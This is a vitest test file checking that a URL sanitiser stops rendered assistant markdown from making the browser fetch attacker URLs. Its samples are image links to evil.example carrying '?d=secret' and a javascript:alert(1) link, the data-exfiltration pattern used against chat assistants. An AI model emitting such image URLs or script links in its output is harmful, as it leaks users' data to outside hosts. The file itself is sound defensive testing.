import { renderToStaticMarkup } from "react-dom/server";
import { Streamdown } from "streamdown";
import { describe, expect, it } from "vitest";
import { safeUrl } from "../../web/safeUrl";

const render = (md: string) => renderToStaticMarkup(<Streamdown urlTransform={safeUrl}>{md}</Streamdown>);

describe("assistant markdown cannot make the browser fetch attacker URLs", () => {
  it("drops markdown images", () => {
    expect(render("before ![x](https://evil.example/?d=secret) after")).not.toContain("evil.example");
  });
  it("drops raw HTML images", () => {
    expect(render('<img src="https://evil.example/?d=secret">')).not.toContain("evil.example");
  });
  it("keeps normal links, drops javascript: and protocol-relative ones", () => {
    const a = { tagName: "a" };
    expect(safeUrl("https://www.home-assistant.io/", "href", a)).toBe("https://www.home-assistant.io/");
    expect(safeUrl("/config", "href", a)).toBe("/config");
    expect(safeUrl("javascript:alert(1)", "href", a)).toBeNull();
    expect(safeUrl("//evil.example/a", "href", a)).toBeNull();
    expect(safeUrl("https://evil.example/x.png", "src", { tagName: "img" })).toBeNull();
    // streamdown renders links as confirm-buttons; make sure a dropped link leaves no URL behind
    expect(render("[x](javascript:alert(1))")).not.toContain("javascript:");
  });
});
